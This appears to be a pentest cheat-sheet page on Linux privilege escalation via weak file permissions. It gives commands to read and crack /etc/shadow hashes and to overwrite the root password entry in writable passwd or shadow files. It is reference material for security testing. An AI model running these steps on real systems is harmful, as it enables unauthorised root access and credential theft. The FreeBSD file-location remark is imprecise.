# Weak File Permissions

## Verification

{% hint style="danger" %}
Remember that if there is a file that cannot be modified (since it is user and group root) but we are in a directory where we have write permissions, what we can do is to delete that file and create another one with the same name.
{% endhint %}

```bash
find / -type f -user root # Search for files belonging to the root user.
find / -type f -group root # Search for files belonging to the root group.
find / -readable 2>/dev/null #Find all the files we can read.
find / -writable 2>/dev/null # Find all files we can write/modify.
find / -executable 2>/dev/null # Find all the files we can execute.
```

## /etc/passwd and /etc/shadow

### Verification

```
ls -l /etc/passwd
ls -l /etc/shadow
```

### If we can read both files

```bash
# Transfer the contents of the two files to our machine and then:
unshadow <PASSWD-FILE> <SHADOW-FILE> > unshadowed.txt
```

Then we can crack them with **john** or **hashcat**.&#x20;

{% hint style="info" %}
It would be best to remove all unhashed users from the unshadowed.txt file (although we can also remove users we are not interested in).
{% endhint %}

```bash
hashcat -a 0 -m 1800 <WORDLIST> <HASH>
```

### If we can read the shadow file

If we can read the /etc/shadow file, then we can extract the hashes we are interested in and crack them:

```bash
john --format=sha512crypt --wordlist=<WORDLIST> <HASH>
```

### If we can write to the passwd file

First generate a password with one of the following commands.

```bash
openssl passwd -1 -salt hello hello
python2 -c 'import crypt; print crypt.crypt("hello", "$6$salt")'
```

Then, we can add a user with the generated password. But, we can also replace the "x" of the root user with the generated password:

```bash
root:x:0:0::/root:/usr/bin/zsh # Before
root:<HASH>:0:0::/root:/usr/bin/zsh # After
```

### If we can write to the shadow file

Replace the hash of a user (as root) generated by the following command:

```bash
mkpasswd -m sha-512 "<NEW_PASSWORD>"
```

### FreeBSD

In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.
